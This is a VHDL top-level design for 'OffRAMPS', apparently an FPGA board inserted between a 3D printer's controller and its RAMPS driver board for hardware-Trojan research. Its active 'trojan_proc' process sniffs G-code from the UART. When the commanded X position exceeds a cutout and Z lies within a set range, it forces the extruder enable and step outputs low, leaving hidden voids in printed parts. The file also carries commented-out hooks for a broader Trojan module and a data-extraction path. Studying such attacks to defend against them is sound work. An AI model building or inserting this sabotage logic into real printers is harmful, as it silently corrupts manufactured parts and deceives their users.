library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.STD_LOGIC_ARITH.ALL;
use IEEE.STD_LOGIC_UNSIGNED.ALL;

entity OffRAMPS_top is
    Port (
    
        -- Nexys Video VADJ
        set_vadj : out std_logic_vector(1 downto 0);
--        vadj_en : out std_logic;
--        vadj_ready : out std_logic;
    
        -- Board Specific IO
        sysclk   : in std_logic;   -- System clock
        led0_g   : out std_logic;  -- RGB LED 0 Green
        led0_r   : out std_logic;  -- RGB LED 0 Red
        i_btn0     : in std_logic;   -- Button[0]
        i_btn1	   : in std_logic;

        led_0    : out std_logic;  -- LED 0
        led_1    : out std_logic;  -- LED 1

--        o_UART_TXD  : out std_logic; -- UART TX OUT

--        -- Thermocouple inputs
--        i_THERM0_n_0 : in std_logic;  -- Thermocouple 0 Negative Single-ended input [0]
--        i_THERM0_p_0 : in std_logic;  -- Thermocouple 0 Positive Single-ended input [0]
--        i_THERM1_n_1 : in std_logic;  -- Thermocouple 1 Negative Single-ended input [1]
--        i_THERM1_p_1 : in std_logic;  -- Thermocouple 1 Positive Single-ended input [1]

        -- Printer Specific IO
        i_D10       : in std_logic;  -- D10 input
        i_D8        : in std_logic;  -- D8 input
        i_D9        : in std_logic;  -- D9 input
        i_E0_DIR    : in std_logic;  -- Extruder 0 Direction input
        i_E0_EN     : in std_logic;  -- Extruder 0 Enable input
        i_E0_STEP   : in std_logic;  -- Extruder 0 Step input
        i_THERM0_SCL: in std_logic;  -- Thermocouple 0 SCL input
        i_THERM0_SDA: in std_logic;  -- Thermocouple 0 SDA input
        i_THERM1_SCL: in std_logic;  -- Thermocouple 1 SCL input
        i_THERM1_SDA: in std_logic;  -- Thermocouple 1 SDA input
        i_UART_RX   : in std_logic;  -- UART RX input
        i_UART_TX   : in std_logic;  -- UART TX input
        i_X_DIR     : in std_logic;  -- X Direction input
        i_X_EN      : in std_logic;  -- X Enable input
        i_X_MAX     : in std_logic;  -- X Max input
        i_X_MIN     : in std_logic;  -- X Min input
        i_X_STEP    : in std_logic;  -- X Step input
        i_Y_DIR     : in std_logic;  -- Y Direction input
        i_Y_EN      : in std_logic;  -- Y Enable input
        i_Y_MAX     : in std_logic;  -- Y Max input
        i_Y_MIN     : in std_logic;  -- Y Min input
        i_Y_STEP    : in std_logic;  -- Y Step input
        i_Z_DIR     : in std_logic;  -- Z Direction input
        i_Z_EN      : in std_logic;  -- Z Enable input
        i_Z_MAX     : in std_logic;  -- Z Max input
        i_Z_MIN     : in std_logic;  -- Z Min input
        i_Z_STEP    : in std_logic;  -- Z Step input

        -- Outputs
        o_D10       : out std_logic;  -- D10 output
        o_D9        : out std_logic;  -- D9 output
        o_D8        : out std_logic;  -- D8 output
        o_E0_DIR    : out std_logic;  -- Extruder 0 Direction output
        o_E0_EN     : out std_logic;  -- Extruder 0 Enable output
        o_E0_STEP   : out std_logic;  -- Extruder 0 Step output
--        o_THERM_EN  : out std_logic;  -- Thermocouple Enable output
        o_UART_RX   : out std_logic;  -- UART RX output
        o_UART_TX   : out std_logic;  -- UART TX output
        o_X_DIR     : out std_logic;  -- X Direction output
        o_X_EN      : out std_logic;  -- X Enable output
        o_X_MAX     : out std_logic;  -- X Max output
        o_X_MIN     : out std_logic;  -- X Min output
        o_X_STEP    : out std_logic;  -- X Step output
        o_Y_DIR     : out std_logic;  -- Y Direction output
        o_Y_EN      : out std_logic;  -- Y Enable output
        o_Y_MAX     : out std_logic;  -- Y Max output
        o_Y_MIN     : out std_logic;  -- Y Min output
        o_Y_STEP    : out std_logic;  -- Y Step output
        o_Z_DIR     : out std_logic;  -- Z Direction output
        o_Z_EN      : out std_logic;  -- Z Enable output
        o_Z_MAX     : out std_logic;  -- Z Max output
        o_Z_MIN     : out std_logic;  -- Z Min output
        o_Z_STEP    : out std_logic   -- Z Step output
    );
end OffRAMPS_top;

architecture Behavioral of OffRAMPS_top is

    COMPONENT clk_wiz_0
    PORT(
        clk_in1         : in std_logic;
        clk_out1        : out std_logic
        );
    END COMPONENT;

	COMPONENT DETECT_HOME
	PORT(
	    i_CLK    : in std_logic;
        i_X_STEP : in std_logic;
        i_Y_STEP : in std_logic;
        i_Z_STEP : in std_logic;
        i_X_MIN  : in std_logic;
        i_Y_MIN  : in std_logic;
        i_Z_MIN  : in std_logic;
        o_homing_complete : out std_logic
		);
	END COMPONENT;

	component UART_STEP_COUNTER is
		Generic (
			SEND_TIMER : integer := 1000000 -- Frequency to send a transaction (in clock ticks)
		);
	    Port (
			-- Control Signals
			i_CLK 			: in  STD_LOGIC;
			i_RST			: in  STD_LOGIC;

			-- Stepper motor signals
			i_X_STEP		: in  STD_LOGIC;
			i_X_DIR			: in  STD_LOGIC;
			i_Y_STEP		: in  STD_LOGIC;
			i_Y_DIR			: in  STD_LOGIC;
			i_Z_STEP		: in  STD_LOGIC;
			i_Z_DIR			: in  STD_LOGIC;
			i_E_STEP		: in  STD_LOGIC;
			i_E_DIR			: in  STD_LOGIC;

			-- Enable
			i_TX_COUNT_EN	: in  STD_LOGIC;

			-- UART output
	        o_UART_TXD		: out  STD_LOGIC
		);
	end component;

    component UART_TX is
        Port ( SEND : in  STD_LOGIC;
               DATA : in  STD_LOGIC_VECTOR (7 downto 0);
               CLK : in  STD_LOGIC;
               READY : out  STD_LOGIC;
               UART_TX : out  STD_LOGIC
        );
    end component;

    component UART_RX is
      generic (
        g_CLKS_PER_BIT : integer := 867     -- 100MHz sysclk, 115200 baud
        );
      port (
        i_Clk       : in  std_logic;
        i_RX_Serial : in  std_logic;
        o_RX_DV     : out std_logic;
        o_RX_Byte   : out std_logic_vector(7 downto 0)
        );
    end component;


    COMPONENT TROJAN_TOP
    Port (
        i_CLK               : in  std_logic;
        homing_complete     : in  std_logic;
        o_LED                : out std_logic;

        -- Data Signals In
        i_D10       : in std_logic;
        i_D8        : in std_logic;
        i_D9        : in std_logic;
        i_E_DIR     : in std_logic;
        i_E_EN      : in std_logic;
        i_E_STEP    : in std_logic;
        i_X_DIR     : in std_logic;
        i_X_EN      : in std_logic;
        i_X_MIN     : in std_logic;
        i_X_STEP    : in std_logic;
        i_Y_DIR     : in std_logic;
        i_Y_EN      : in std_logic;
        i_Y_MIN     : in std_logic;
        i_Y_STEP    : in std_logic;
        i_Z_DIR     : in std_logic;
        i_Z_EN      : in std_logic;
        i_Z_MIN     : in std_logic;
        i_Z_STEP    : in std_logic;

        -- Data Signals Out
        o_D10       : out std_logic;
        o_D9        : out std_logic;
        o_D8        : out std_logic;
        o_E_DIR     : out std_logic;
        o_E_EN      : out std_logic;
        o_E_STEP    : out std_logic;
        o_X_DIR     : out std_logic;
        o_X_EN      : out std_logic;
        o_X_MIN     : out std_logic;
        o_X_STEP    : out std_logic;
        o_Y_DIR     : out std_logic;
        o_Y_EN      : out std_logic;
        o_Y_MIN     : out std_logic;
        o_Y_STEP    : out std_logic;
        o_Z_DIR     : out std_logic;
        o_Z_EN      : out std_logic;
        o_Z_MIN     : out std_logic;
        o_Z_STEP    : out std_logic
    );
    END COMPONENT;
    
    component GCODE_PARSER is
      Port (
        i_clk : in std_logic;
        i_rst : in std_logic;
        
        i_gcode_byte : in std_logic_vector(7 downto 0);
        i_gcode_byte_valid : in std_logic;
        
        o_got_x : out std_logic;
        o_got_y : out std_logic;
        o_got_z : out std_logic;
        
        o_x_val : out std_logic_vector(23 downto 0);
        o_y_val : out std_logic_vector(23 downto 0);
        o_z_val : out std_logic_vector(23 downto 0);
        
        o_gcode_complete : out std_logic
      );
    end component;

    component BCD_to_binary is
        port (
            i_clk : in std_logic;
            i_rst : in std_logic;
            i_ready : in std_logic;
            o_done : out std_logic;
    
            i_BCD_6_digit : in std_logic_vector(23 downto 0);
            o_binary : out std_logic_vector(19 downto 0)
        );
    end component;

    --signal sysclk :std_logic;

    -- Bypass mode control signals
    signal bypass_mode_en : std_logic := '1';
    signal button_debounce : std_logic_vector(1 downto 0) := "00";
    signal button_press : std_logic;
    signal home_complete_buf :std_logic := '0';

    -- Trojan Modified Output Signals
    signal s_troj_led    : std_logic :='0';

    signal s_mod_D10     : std_logic :='0';
    signal s_mod_D8      : std_logic :='0';
    signal s_mod_D9      : std_logic :='0';
    signal s_mod_E0_DIR  : std_logic :='0';
    signal s_mod_E0_EN   : std_logic :='0';
    signal s_mod_E0_STEP : std_logic :='0';
    signal s_mod_X_DIR   : std_logic :='0';
    signal s_mod_X_EN    : std_logic :='0';
    signal s_mod_X_MIN   : std_logic :='0';
    signal s_mod_X_STEP  : std_logic :='0';
    signal s_mod_Y_DIR   : std_logic :='0';
    signal s_mod_Y_EN    : std_logic :='0';
    signal s_mod_Y_MIN   : std_logic :='0';
    signal s_mod_Y_STEP  : std_logic :='0';
    signal s_mod_Z_DIR   : std_logic :='0';
    signal s_mod_Z_EN    : std_logic :='0';
    signal s_mod_Z_MIN   : std_logic :='0';
    signal s_mod_Z_STEP  : std_logic :='0';
    
    signal s_uart_rx_valid : std_logic := '0';
    signal s_uart_rx_valid_latch : std_logic := '0';
    signal s_uart_rx_byte : std_logic_vector(7 downto 0) := x"00";
    signal s_uart_tx_ready : std_logic := '0';
    signal s_send_byte : std_logic := '0';
    
    signal s_uart_tx : std_logic;
    
    signal s_test_byte : std_logic_vector(7 downto 0) := x"21";

    signal s_debug_clk : std_logic;
    
    signal s_x_val : std_logic_vector(23 downto 0);
    signal s_y_val : std_logic_vector(23 downto 0);
    signal s_z_val : std_logic_vector(23 downto 0);
    signal s_gcode_complete : std_logic;
    
    signal s_got_x : std_logic;
    signal s_got_y : std_logic;
    signal s_got_z : std_logic;
    
    signal s_x_location : std_logic_vector(19 downto 0);
    signal s_y_location : std_logic_vector(19 downto 0);
    signal s_z_location : std_logic_vector(19 downto 0);
    
    signal s_x_conversion_done : std_logic;
    signal s_y_conversion_done : std_logic;
    signal s_z_conversion_done : std_logic;
    
    signal s_gcode_parsed : std_logic;
    
    signal s_stop_extrusion : std_logic := '0';
    
    --constant X_CUTOUT : unsigned(19 downto 0) := X"222E0";
    constant X_CUTOUT : unsigned(19 downto 0) := X"249F0";

    constant Z_START : unsigned(19 downto 0) := X"00190";
    constant Z_STOP : unsigned(19 downto 0) := X"01770";

begin

    set_vadj <= "11";

    ----------------------- Component Instantiantions -----------------

    -- Generate the 100 Mhz clock for logic + Uart ops
--    inst_clk: clk_wiz_0 port map(
--        clk_in1 => sysclk,
--        clk_out1 => s_debug_clk
--        );

	-- UART Handler

--	UART_STEP_COUNTER_0 : UART_STEP_COUNTER
--		generic map (
--			SEND_TIMER  => 10000000
--		)
--	    port map (
--			-- Control Signals
--			i_CLK 			 => sysclk,
--			i_RST			 => i_btn1,
--			-- Stepper motor signals
--			i_X_STEP		 => i_X_STEP,
--			i_X_DIR			 => i_X_DIR,
--			i_Y_STEP		 => i_Y_STEP,
--			i_Y_DIR			 => i_Y_DIR,
--			i_Z_STEP		 => i_Z_STEP,
--			i_Z_DIR			 => i_Z_DIR,
--			i_E_STEP		 => i_E0_STEP,
--			i_E_DIR			 => i_E0_DIR,
--			-- Enable
--			i_TX_COUNT_EN	 => home_complete_buf,
--			-- UART output
--	        o_UART_TXD		 => o_UART_TXD
--	);


    -- Homing Sequence detection Component
--    HomingDetector : DETECT_HOME PORT MAP(
--        i_CLK       => sysclk,
--        i_X_STEP    => i_X_STEP,
--        i_Y_STEP    => i_Y_STEP,
--        i_Z_STEP    => i_Z_STEP,
--        i_X_MIN     => i_X_MIN,
--        i_Y_MIN     => i_Y_MIN,
--        i_Z_MIN     => i_Z_MIN,
--        o_homing_complete => home_complete_buf
--    );

--    Trojans : TROJAN_TOP PORT MAP (
--        i_CLK               => sysclk,
--        homing_complete     => home_complete_buf,
--        o_LED               => s_troj_led,
--        -- Data Signals In
--        i_D10       => i_D10         ,
--        i_D8        => i_D8          ,
--        i_D9        => i_D9          ,
--        i_E_DIR     => i_E0_DIR      ,
--        i_E_EN      => i_E0_EN       ,
--        i_E_STEP    => i_E0_STEP     ,
--        i_X_DIR     => i_X_DIR       ,
--        i_X_EN      => i_X_EN        ,
--        i_X_MIN     => i_X_MIN       ,
--        i_X_STEP    => i_X_STEP      ,
--        i_Y_DIR     => i_Y_DIR       ,
--        i_Y_EN      => i_Y_EN        ,
--        i_Y_MIN     => i_Y_MIN       ,
--        i_Y_STEP    => i_Y_STEP      ,
--        i_Z_DIR     => i_Z_DIR       ,
--        i_Z_EN      => i_Z_EN        ,
--        i_Z_MIN     => i_Z_MIN       ,
--        i_Z_STEP    => i_Z_STEP      ,
--        -- Data Signals Out
--        o_D10       => s_mod_D10     ,
--        o_D8        => s_mod_D8      ,
--        o_D9        => s_mod_D9      ,
--        o_E_DIR     => s_mod_E0_DIR  ,
--        o_E_EN      => s_mod_E0_EN   ,
--        o_E_STEP    => s_mod_E0_STEP ,
--        o_X_DIR     => s_mod_X_DIR   ,
--        o_X_EN      => s_mod_X_EN    ,
--        o_X_MIN     => s_mod_X_MIN   ,
--        o_X_STEP    => s_mod_X_STEP  ,
--        o_Y_DIR     => s_mod_Y_DIR   ,
--        o_Y_EN      => s_mod_Y_EN    ,
--        o_Y_MIN     => s_mod_Y_MIN   ,
--        o_Y_STEP    => s_mod_Y_STEP  ,
--        o_Z_DIR     => s_mod_Z_DIR   ,
--        o_Z_EN      => s_mod_Z_EN    ,
--        o_Z_MIN     => s_mod_Z_MIN   ,
--        o_Z_STEP    => s_mod_Z_STEP
--    );


    UART_RX_inst0 : UART_RX
        port map (
            i_clk => sysclk,
            i_rx_serial => i_UART_RX,
            o_rx_dv => s_uart_rx_valid,
            o_rx_byte => s_uart_rx_byte
        );
        
        
    gcode_parser_inst0 : GCODE_PARSER
        port map(
            i_clk => sysclk,
            i_rst => i_btn1,
            i_gcode_byte => s_uart_rx_byte,
            i_gcode_byte_valid => s_uart_rx_valid,
            o_got_x => s_got_x,
            o_got_y => s_got_y,
            o_got_z => s_got_z,
            o_x_val => s_x_val,
            o_y_val => s_y_val,
            o_z_val => s_z_val,
            o_gcode_complete => s_gcode_complete
        );
        
    bcd_bin_x : bcd_to_binary
        port map(
            i_clk => sysclk,
            i_rst => i_btn1,
            i_ready => (s_gcode_complete and s_got_x),
            o_done => s_x_conversion_done,
            i_BCD_6_digit => s_x_val,
            o_binary => s_x_location
        );
          
bcd_bin_y : bcd_to_binary
        port map(
            i_clk => sysclk,
            i_rst => i_btn1,
            i_ready => (s_gcode_complete and s_got_y),
            o_done => s_y_conversion_done,
            i_BCD_6_digit => s_y_val,
            o_binary => s_y_location
        );
        
        
bcd_bin_z : bcd_to_binary
        port map(
            i_clk => sysclk,
            i_rst => i_btn1,
            i_ready => (s_gcode_complete and s_got_z),
            o_done => s_z_conversion_done,
            i_BCD_6_digit => s_z_val,
            o_binary => s_z_location
        );
        
        
        
gcode_parsed_proc : process (sysclk,i_btn1) begin
    if (i_btn1 = '1') then
        s_gcode_parsed <= '0';
    elsif (rising_edge(sysclk)) then
        s_gcode_parsed <= s_gcode_complete and (s_x_conversion_done or s_y_conversion_done or s_z_conversion_done);
    end if;
end process;

trojan_proc : process (sysclk, i_btn1) begin
    if (i_btn1 = '1') then
        s_stop_extrusion <= '0';
    elsif (rising_edge(sysclk)) then
        if s_gcode_parsed = '1' then
            if (unsigned(s_x_location) > X_CUTOUT and unsigned(s_z_location) > Z_START and unsigned(s_z_location) < Z_STOP) then
                s_stop_extrusion <= '1';
            else
                s_stop_extrusion <= '0';
            end if;
        end if;
    end if;
end process;

--    UART_TX_inst0 : UART_TX
--        port map (
--            send => s_uart_rx_valid,
--            data => s_uart_rx_byte,
--            clk => sysclk,
--            ready => s_uart_tx_ready,
--            uart_tx => s_uart_tx
--        );
    
--    o_UART_TX <= s_uart_tx;
    
            
    --------------------------- LOGIC --------------------------

    -- Button Press Detection --> We may need to use the 12 Mhz cloxk for this
    -- or use a bigger debounce register for 100 Mhz
    button_press <= not button_debounce(1) and button_debounce(0);

    process (sysclk)
    begin
        if rising_edge(sysclk) then
            button_debounce <= button_debounce(0) & i_btn0;
            if button_press = '1' then
                bypass_mode_en <= not bypass_mode_en;
            end if;
        end if;
    end process;

    -- Set LEDs
    led_0  <= home_complete_buf; -- Home Complete Indicator
    led_1  <= s_gcode_complete;
    led0_g <= s_gcode_parsed; -- Trojans are off = Green
    led0_r <= s_stop_extrusion;     -- Trojans are on = Red

    -- BYPASS MUX
    -- Muxes Used in the trojan implementation
    o_D10       <= s_mod_D10 when bypass_mode_en = '0' else i_D10;
    o_D9        <= s_mod_D9  when bypass_mode_en = '0' else i_D9;
    o_D8        <= s_mod_D8  when bypass_mode_en = '0' else i_D8;

    o_E0_DIR    <= s_mod_E0_DIR  when bypass_mode_en = '0' else i_E0_DIR;
    o_E0_EN     <= '0'   when s_stop_extrusion = '1' else i_E0_EN;
    o_E0_STEP   <= '0' when s_stop_extrusion = '1' else i_E0_STEP;

    o_X_DIR     <= s_mod_X_DIR   when bypass_mode_en = '0' else i_X_DIR;
    o_X_EN      <= s_mod_X_EN    when bypass_mode_en = '0' else i_X_EN;
    o_X_MIN     <= s_mod_X_MIN   when bypass_mode_en = '0' else i_X_MIN;
    o_X_STEP    <= s_mod_X_STEP  when bypass_mode_en = '0' else i_X_STEP;

    o_Y_DIR     <= s_mod_Y_DIR  when bypass_mode_en = '0' else i_Y_DIR;
    o_Y_EN      <= s_mod_Y_EN   when bypass_mode_en = '0' else i_Y_EN;
    o_Y_MIN     <= s_mod_Y_MIN  when bypass_mode_en = '0' else i_Y_MIN;
    o_Y_STEP    <= s_mod_Y_STEP when bypass_mode_en = '0' else i_Y_STEP;

    o_Z_DIR     <= s_mod_Z_DIR  when bypass_mode_en = '0' else i_Z_DIR;
    o_Z_EN      <= s_mod_Z_EN   when bypass_mode_en = '0' else i_Z_EN;
    o_Z_MIN     <= s_mod_Z_MIN  when bypass_mode_en = '0' else i_Z_MIN;
    o_Z_STEP    <= s_mod_Z_STEP when bypass_mode_en = '0' else i_Z_STEP;

    -- MUXes used in the DATA Extraction Tool (Not Yet Implementeted)
    o_UART_RX   <= 'Z' when bypass_mode_en = '0' else i_UART_RX;
    --o_UART_TX   <= 'Z' when bypass_mode_en = '0' else i_UART_TX;

    -- MUXes used in the diginal twin

    -- Other MUXes
    o_X_MAX     <= 'Z' when bypass_mode_en = '0' else i_X_MAX;
    o_Y_MAX     <= 'Z' when bypass_mode_en = '0' else i_Y_MAX;
    o_Z_MAX     <= 'Z' when bypass_mode_en = '0' else i_Z_MAX;

    -- Currently, We are jumping the termocouple from ramps --> arduino
    -- Thermometer Enable output might combine two inputs or have a default state
--    o_THERM_EN  <= '0';


end Behavioral;
